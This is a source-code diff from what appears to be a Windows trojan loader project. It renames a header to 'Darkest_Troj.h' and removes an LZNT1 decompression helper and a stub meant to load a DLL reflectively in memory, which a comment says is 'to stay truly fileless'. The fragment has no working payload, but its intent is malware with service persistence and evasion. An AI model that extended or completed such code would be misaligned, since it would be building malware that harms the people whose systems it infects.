@@ -2,7 +2,7 @@
 // Created by mikul on 04.01.2026.
 //
 #include "library.h"
-#include "Darkest_loader.h"
+#include "Darkest_Troj.h"
 #include "updater.h"
 
 API_TABLE api;
@@ -49,26 +49,6 @@ int RegisterService(API_TABLE *api) {
     return 0;
 }
 
-
-unsigned char *decompress(PBYTE buffer, unsigned long size, unsigned long originalSize) {
-    unsigned char *decompressed = (unsigned char *) malloc(originalSize);
-    unsigned long finalSize = 0;
-
-    NTSTATUS decompressStatus = api.RtlDecompressBuffer(
-        COMPRESSION_FORMAT_LZNT1, decompressed, originalSize, buffer, size, &finalSize);
-    if (decompressStatus != 0) {
-        free(decompressed);
-        return nullptr;
-    }
-    return decompressed;
-}
-
-
-/// Should reflectively run the dll in memory to stay truly fileless, we could go down to a file on system theoretically
-/// @return 0 on success
-int AllocDllReflection() {
-    return 0;
-}
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
     switch (fdwReason) {
